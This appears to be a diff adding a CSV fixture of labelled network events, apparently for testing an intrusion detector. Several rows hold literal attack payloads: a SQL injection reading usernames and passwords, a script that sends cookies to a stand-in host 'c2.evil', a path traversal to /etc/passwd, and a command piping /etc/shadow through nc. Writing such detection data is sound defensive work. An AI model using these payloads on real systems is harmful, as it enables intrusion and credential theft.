@@ -1,0 +1,10 @@
+timestamp,src_ip,dst_ip,event_type,payload,packets_per_sec,bytes_per_sec,syn_ratio,unique_dst_ports,failed_logins,username
+2026-09-18T10:00:01Z,185.220.101.5,10.0.0.1,web_request,"' UNION SELECT id, username, password FROM auth_users --",50,25000,0.05,1,0,
+2026-09-18T10:00:05Z,45.154.255.89,10.0.0.1,web_request,"<script>fetch('http://c2.evil/?c='+document.cookie)</script>",45,21000,0.04,1,0,
+2026-09-18T10:00:10Z,91.240.118.172,10.0.0.1,web_request,"../../../../../../etc/passwd",30,15000,0.02,1,0,
+2026-09-18T10:00:15Z,194.26.29.112,10.0.0.1,web_request,"; cat /etc/shadow | nc 10.0.0.1 4444",25,12000,0.01,1,0,
+2026-09-18T10:00:20Z,103.203.57.10,10.0.0.1,auth_log,"SSH login failure",40,18000,0.03,1,45,root
+2026-09-18T10:00:25Z,178.62.204.11,10.0.0.1,network_flow,"TCP SYN Flood",8500,12500000,0.96,1,0,
+2026-09-18T10:00:30Z,193.106.191.22,10.0.0.1,network_flow,"Nmap SYN Scan",450,42000,0.92,85,0,
+2026-09-18T10:00:35Z,12.34.56.78,10.0.0.1,web_request,"category=electronics&page=2",60,35000,0.05,1,0,
+2026-09-18T10:00:40Z,8.8.8.8,10.0.0.1,network_flow,"DNS Resolution",35,14000,0.04,1,0,
